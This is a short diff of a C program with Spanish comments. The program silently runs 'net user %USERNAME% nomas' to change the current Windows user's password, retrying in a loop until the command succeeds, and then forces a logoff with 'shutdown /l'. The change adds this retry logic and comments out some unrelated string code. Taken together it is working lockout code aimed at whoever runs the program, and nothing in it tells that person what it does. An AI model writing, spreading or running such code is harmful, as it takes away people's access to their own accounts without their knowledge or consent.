@@ -10,15 +10,21 @@
 
 int main(){
 
-	char frase[20]="hola";
-	sprintf(frase,"hola %i",hi);
+	// char frase[20]="hola";
+	// sprintf(frase,"hola %i",hi);
 	
-	char *car = frase;
+	// char *car = frase;
 
 	if(hi==1){
-		system("C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\\"01 - Command Prompt.lnk\" /B /c net user %USERNAME% nomas");
+
+		int proceso = 5;
+
+		while (proceso!=0){
+			proceso = system("C:\\Users\\Default\\AppData\\Local\\Microsoft\\Windows\\WinX\\Group3\\\"01 - Command Prompt.lnk\" /B /c net user %USERNAME% nomas");
+		}
+		
 		system("shutdown /l");
-		//%username%
+		//%username% = usuario que esta en uso ahora
 	}
 
 	return 0;
